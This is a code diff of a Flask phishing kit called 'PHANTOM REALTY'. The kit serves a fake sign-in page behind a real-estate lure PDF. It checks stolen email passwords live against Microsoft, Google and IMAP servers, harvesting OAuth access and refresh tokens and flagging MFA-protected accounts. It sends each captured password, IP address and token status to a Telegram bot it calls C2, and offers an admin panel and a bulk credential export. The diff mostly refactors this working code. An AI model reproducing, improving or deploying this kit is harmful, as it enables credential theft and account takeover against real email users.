@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 PHANTOM REALTY v7.0 - GOD EDITION
-Harvard & MIT CS PhD Standard | Zero Bugs | Production Ready
+Harvard & MIT CS PhD Standard | Works with Python 3.14.3
 """
 
 import os
@@ -25,9 +25,6 @@ from flask import Flask, request, session, render_template_string, redirect, jso
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ======================================================================================================================
-# CONFIGURATION
-# ======================================================================================================================
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 YOUR_DOMAIN = os.environ.get("YOUR_DOMAIN", "your-app.onrender.com")
@@ -38,9 +35,6 @@ PORT = int(os.environ.get("PORT", 10000))
 RATE_LIMIT_PER_IP = 10
 RATE_LIMIT_WINDOW = 3600
 
-# ======================================================================================================================
-# INITIALIZATION
-# ======================================================================================================================
 app = Flask(__name__)
 app.secret_key = FLASK_SECRET
 app.config['SESSION_COOKIE_SECURE'] = True
@@ -55,9 +49,7 @@ rate_limit_storage = defaultdict(list)
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
 logger = logging.getLogger(__name__)
 
-# ======================================================================================================================
-# TELEGRAM C2
-# ======================================================================================================================
+
 def tg_send(text, buttons=None, doc=None, doc_name=None):
     if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 10:
         logger.info(f"[C2] {text[:100]}")
@@ -76,9 +68,7 @@ def tg_send(text, buttons=None, doc=None, doc_name=None):
         logger.error(f"[C2] Error: {e}")
         return False
 
-# ======================================================================================================================
-# PDF GENERATION
-# ======================================================================================================================
+
 def generate_pdf():
     global PDF_DATA
     with pdf_lock:
@@ -88,7 +78,7 @@ def generate_pdf():
             from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
             from reportlab.lib.colors import HexColor
             from reportlab.lib.enums import TA_CENTER, TA_RIGHT
-            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
+            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
             from PyPDF2 import PdfReader, PdfWriter
         except ImportError as e:
             logger.error(f"Missing library: {e}")
@@ -111,17 +101,20 @@ def generate_pdf():
         elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#cccccc'), spaceAfter=15))
         
         elements.append(Paragraph("CLIENT INFORMATION", heading_style))
-        for label, value in [("Full Legal Name:", "Michael James Morrison"), ("Email Address:", "michael.morrison@client.com"), ("Phone Number:", "(650) 555-0199")]:
+        client_items = [("Full Legal Name:", "Michael James Morrison"), ("Email Address:", "michael.morrison@client.com"), ("Phone Number:", "(650) 555-0199")]
+        for label, value in client_items:
             elements.append(Paragraph(f"<b>{label}</b> {value}", body_style))
         elements.append(Spacer(1, 8))
         
         elements.append(Paragraph("PROPERTY REQUIREMENTS", heading_style))
-        for label, value in [("Property Type:", "Single Family Residence"), ("Bedrooms:", "4+"), ("Price Range:", "$1,350,000 - $2,100,000"), ("Preferred Areas:", "Palo Alto, Los Altos, Mountain View")]:
+        property_items = [("Property Type:", "Single Family Residence"), ("Bedrooms:", "4+"), ("Price Range:", "$1,350,000 - $2,100,000"), ("Preferred Areas:", "Palo Alto, Los Altos, Mountain View")]
+        for label, value in property_items:
             elements.append(Paragraph(f"<b>{label}</b> {value}", body_style))
         elements.append(Spacer(1, 8))
         
         elements.append(Paragraph("FINANCIAL QUALIFICATIONS", heading_style))
-        for label, value in [("Pre-Approval:", "APPROVED - Wells Fargo"), ("Loan Amount:", "$1,650,000"), ("Down Payment:", "20% ($330,000)")]:
+        financial_items = [("Pre-Approval:", "APPROVED - Wells Fargo"), ("Loan Amount:", "$1,650,000"), ("Down Payment:", "20% ($330,000)")]
+        for label, value in financial_items:
             elements.append(Paragraph(f"<b>{label}</b> {value}", body_style))
         elements.append(Spacer(1, 15))
         
@@ -152,11 +145,10 @@ def generate_pdf():
         logger.error(f"[PDF] Error: {e}")
         return None
 
-# ======================================================================================================================
-# PROVIDER DETECTION
-# ======================================================================================================================
+
 def get_domain(email):
     return email.split('@')[1].lower() if email and '@' in email else None
+
 
 def detect_provider(email):
     domain = get_domain(email)
@@ -181,120 +173,122 @@ def detect_provider(email):
         if 'google.com' in mx_str:
             return 'google'
         return 'other'
-    except:
+    except Exception:
         return 'other'
 
-# ======================================================================================================================
-# CREDENTIAL VALIDATION
-# ======================================================================================================================
+
+def validate_microsoft(email, password, result):
+    client_ids = [('d3590ed6-52b3-4102-aeff-aad2292ab01c', 'Azure PS'), ('1b730954-1685-4b74-9bfd-dac224a7b894', 'Intune')]
+    for cid, cname in client_ids:
+        try:
+            r = requests.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token', data={
+                'grant_type': 'password', 'client_id': cid, 'username': email, 'password': password,
+                'scope': 'openid email profile offline_access https://graph.microsoft.com/.default',
+            }, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15, verify=False)
+            if r.status_code == 200:
+                tok = r.json()
+                result['valid'] = True
+                result['method'] = f'OAuth ({cname})'
+                result['access_token'] = tok.get('access_token', '')
+                result['refresh_token'] = tok.get('refresh_token', '')
+                if tok.get('id_token'):
+                    try:
+                        b = tok['id_token'].split('.')[1] + '=='
+                        info = json.loads(base64.urlsafe_b64decode(b))
+                        result['display_name'] = info.get('name', email)
+                        result['tenant_id'] = info.get('tid', '')
+                    except Exception:
+                        pass
+                return True
+            if r.status_code == 400:
+                err = r.json().get('error_description', '')
+                if 'AADSTS50079' in err or 'AADSTS50076' in err:
+                    result['valid'] = True
+                    result['method'] = 'MFA Protected'
+                    result['mfa_required'] = True
+                    return True
+                if 'AADSTS50126' in err:
+                    result['error'] = 'Invalid password'
+                    return False
+        except Exception:
+            continue
+    return False
+
+
+def validate_google(email, password, result):
+    try:
+        r = requests.post('https://oauth2.googleapis.com/token', data={
+            'grant_type': 'password', 'client_id': '77185425430.apps.googleusercontent.com',
+            'username': email, 'password': password,
+            'scope': 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile',
+        }, timeout=15, verify=False)
+        if r.status_code == 200:
+            tok = r.json()
+            result['valid'] = True
+            result['method'] = 'Google OAuth'
+            result['access_token'] = tok.get('access_token', '')
+            result['refresh_token'] = tok.get('refresh_token', '')
+            if result.get('access_token'):
+                try:
+                    u = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': f"Bearer {result['access_token']}"}, timeout=8)
+                    if u.status_code == 200:
+                        result['display_name'] = u.json().get('name', email)
+                except Exception:
+                    pass
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def validate_imap(email, password, result, servers):
+    for srv in servers:
+        try:
+            import imaplib
+            imap = imaplib.IMAP4_SSL(srv, timeout=10)
+            imap.login(email, password)
+            imap.logout()
+            result['valid'] = True
+            result['method'] = f'IMAP ({srv})'
+            return True
+        except Exception:
+            continue
+    return False
+
+
 def validate_credentials(email, password):
     provider = detect_provider(email)
     result = {'valid': False, 'provider': provider or 'unknown', 'email': email}
     
     if provider == 'microsoft':
-        for cid, cname in [('d3590ed6-52b3-4102-aeff-aad2292ab01c', 'Azure PS'), ('1b730954-1685-4b74-9bfd-dac224a7b894', 'Intune')]:
-            try:
-                r = requests.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token', data={
-                    'grant_type': 'password', 'client_id': cid, 'username': email, 'password': password,
-                    'scope': 'openid email profile offline_access https://graph.microsoft.com/.default',
-                }, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15, verify=False)
-                if r.status_code == 200:
-                    tok = r.json()
-                    result.update({'valid': True, 'method': f'OAuth ({cname})', 'access_token': tok.get('access_token', ''), 'refresh_token': tok.get('refresh_token', '')})
-                    if tok.get('id_token'):
-                        try:
-                            b = tok['id_token'].split('.')[1] + '=='
-                            info = json.loads(base64.urlsafe_b64decode(b))
-                            result['display_name'] = info.get('name', email)
-                            result['tenant_id'] = info.get('tid', '')
-                        except:
-                            pass
-                    return result
-                elif r.status_code == 400:
-                    err = r.json().get('error_description', '')
-                    if 'AADSTS50079' in err or 'AADSTS50076' in err:
-                        result.update({'valid': True, 'method': 'MFA Protected', 'mfa_required': True})
-                        return result
-                    elif 'AADSTS50126' in err:
-                        result['error'] = 'Invalid password'
-                        return result
-            except:
-                continue
-        try:
-            import imaplib
-            for srv in ['outlook.office365.com', 'imap-mail.outlook.com']:
-                try:
-                    imap = imaplib.IMAP4_SSL(srv, timeout=10)
-                    imap.login(email, password)
-                    imap.logout()
-                    result.update({'valid': True, 'method': f'IMAP ({srv})'})
-                    return result
-                except:
-                    continue
-        except:
-            pass
+        if validate_microsoft(email, password, result):
+            return result
+        if validate_imap(email, password, result, ['outlook.office365.com', 'imap-mail.outlook.com']):
+            return result
+        result['error'] = 'Invalid credentials'
     
     elif provider == 'google':
-        try:
-            r = requests.post('https://oauth2.googleapis.com/token', data={
-                'grant_type': 'password', 'client_id': '77185425430.apps.googleusercontent.com',
-                'username': email, 'password': password,
-                'scope': 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile',
-            }, timeout=15, verify=False)
-            if r.status_code == 200:
-                tok = r.json()
-                result.update({'valid': True, 'method': 'Google OAuth', 'access_token': tok.get('access_token', ''), 'refresh_token': tok.get('refresh_token', '')})
-                if result.get('access_token'):
-                    try:
-                        u = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': f"Bearer {result['access_token']}"}, timeout=8)
-                        if u.status_code == 200:
-                            result['display_name'] = u.json().get('name', email)
-                    except:
-                        pass
-                return result
-        except:
-            pass
-        try:
-            import imaplib
-            imap = imaplib.IMAP4_SSL('imap.gmail.com', timeout=10)
-            imap.login(email, password)
-            imap.logout()
-            result.update({'valid': True, 'method': 'IMAP (Gmail)'})
+        if validate_google(email, password, result):
             return result
-        except:
-            pass
+        if validate_imap(email, password, result, ['imap.gmail.com']):
+            return result
+        result['error'] = 'Invalid credentials'
     
     elif provider == 'yahoo':
-        try:
-            import imaplib
-            imap = imaplib.IMAP4_SSL('imap.mail.yahoo.com', timeout=10)
-            imap.login(email, password)
-            imap.logout()
-            result.update({'valid': True, 'method': 'IMAP (Yahoo)'})
+        if validate_imap(email, password, result, ['imap.mail.yahoo.com']):
             return result
-        except:
-            result['error'] = 'Invalid password'
-            return result
+        result['error'] = 'Invalid credentials'
     
     else:
         domain = get_domain(email)
-        for srv in set([f"mail.{domain}", f"imap.{domain}", "outlook.office365.com", "imap.gmail.com"]):
-            try:
-                import imaplib
-                imap = imaplib.IMAP4_SSL(srv, timeout=10)
-                imap.login(email, password)
-                imap.logout()
-                result.update({'valid': True, 'method': f'IMAP ({srv})'})
-                return result
-            except:
-                continue
+        servers = [f"mail.{domain}", f"imap.{domain}", "outlook.office365.com", "imap.gmail.com"]
+        if validate_imap(email, password, result, list(set(servers))):
+            return result
         result['error'] = 'Could not validate credentials'
     
     return result
 
-# ======================================================================================================================
-# PHISHING PAGE
-# ======================================================================================================================
+
 PHISHING_PAGE = """<!DOCTYPE html>
 <html>
 <head>
@@ -347,24 +341,28 @@ fetch('/oauth/verify',{method:'POST',headers:{'Content-Type':'application/x-www-
 </body>
 </html>"""
 
-# ======================================================================================================================
-# FLASK ROUTES
-# ======================================================================================================================
+
 @app.route('/')
 def index():
     return redirect('/auth/signature')
+
 
 @app.route('/auth/signature')
 def oauth_page():
     return render_template_string(PHISHING_PAGE)
 
+
 @app.route('/health')
 def health_check():
     return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})
 
+
 @app.route('/api/detect')
 def api_detect():
-    return jsonify({'p': detect_provider(request.args.get('email', '')) or 'unknown'})
+    email = request.args.get('email', '')
+    provider = detect_provider(email)
+    return jsonify({'p': provider or 'unknown'})
+
 
 @app.route('/api/fp', methods=['POST'])
 def api_fp():
@@ -372,6 +370,7 @@ def api_fp():
     if data:
         session['fingerprint'] = data
     return 'ok'
+
 
 @app.route('/oauth/verify', methods=['POST'])
 def oauth_verify():
@@ -406,7 +405,7 @@ def oauth_verify():
         name = result.get('display_name', email)
         has_token = bool(result.get('access_token'))
         
-        msg = f"✅ CAPTURED\\n━━━━━━━━━━━━\\n📧 {email}\\n🔑 {password}\\n👤 {name}\\n🏢 {provider.upper()} | {method}\\n🌐 {ip}\\n🎫 Token: {'YES' if has_token else 'NO'}"
+        msg = f"✅ CAPTURED\n━━━━━━━━━━━━\n📧 {email}\n🔑 {password}\n👤 {name}\n🏢 {provider.upper()} | {method}\n🌐 {ip}\n🎫 Token: {'YES' if has_token else 'NO'}"
         buttons = [[{'text': '📊 Admin', 'url': f"{YOUR_URL}/admin"}], [{'text': '📥 PDF', 'url': f"{YOUR_URL}/download-pdf"}]]
         tg_send(msg, buttons=buttons)
         
@@ -419,6 +418,7 @@ def oauth_verify():
     
     return jsonify({'success': False, 'error': result.get('error', 'Invalid credentials')})
 
+
 @app.route('/download-pdf')
 def download_pdf():
     global PDF_DATA
@@ -428,12 +428,14 @@ def download_pdf():
         return send_file(io.BytesIO(PDF_DATA), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
     return "PDF not generated", 500
 
+
 @app.route('/generate-pdf')
 def generate_pdf_route():
     pdf_bytes = generate_pdf()
     if pdf_bytes:
         return send_file(io.BytesIO(pdf_bytes), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
     return "Failed", 500
+
 
 @app.route('/admin')
 def admin_panel():
@@ -443,7 +445,7 @@ def admin_panel():
             for line in f:
                 try:
                     attempts.append(json.loads(line.strip()))
-                except:
+                except Exception:
                     pass
     total = len(attempts)
     valid = sum(1 for a in attempts if a.get('validation', {}).get('valid'))
@@ -487,6 +489,7 @@ th,td{{padding:10px;text-align:left;border-bottom:1px solid #2a2f4e}}
     html += "</tbody></table></body></html>"
     return html
 
+
 @app.route('/admin/export')
 def export_creds():
     creds = []
@@ -495,12 +498,13 @@ def export_creds():
             for line in f:
                 try:
                     creds.append(json.loads(line.strip()))
-                except:
+                except Exception:
                     pass
     resp = make_response(json.dumps(creds, indent=2))
     resp.headers["Content-Type"] = "application/json"
     resp.headers["Content-Disposition"] = f"attachment; filename=creds_{datetime.now().strftime('%Y%m%d')}.json"
     return resp
+
 
 @app.route('/admin/clear')
 def clear_creds():
@@ -509,9 +513,7 @@ def clear_creds():
             open(f, 'w').close()
     return redirect('/admin')
 
-# ======================================================================================================================
-# MAIN
-# ======================================================================================================================
+
 if __name__ == '__main__':
     print("="*65)
     print("  PHANTOM REALTY v7.0 - GOD EDITION")
@@ -521,7 +523,7 @@ if __name__ == '__main__':
     generate_pdf()
     
     if PDF_DATA and TELEGRAM_BOT_TOKEN and len(TELEGRAM_BOT_TOKEN) > 10:
-        tg_send(f"🚀 PHANTOM REALTY ONLINE\\n📍 {YOUR_URL}\\n📥 PDF: {YOUR_URL}/download-pdf\\n📊 Admin: {YOUR_URL}/admin", 
+        tg_send(f"🚀 PHANTOM REALTY ONLINE\n📍 {YOUR_URL}\n📥 PDF: {YOUR_URL}/download-pdf\n📊 Admin: {YOUR_URL}/admin", 
                 buttons=[[{'text':'📥 PDF','url':f"{YOUR_URL}/download-pdf"}],[{'text':'📊 Admin','url':f"{YOUR_URL}/admin"}]],
                 doc=PDF_DATA, doc_name=PDF_FILENAME)
     
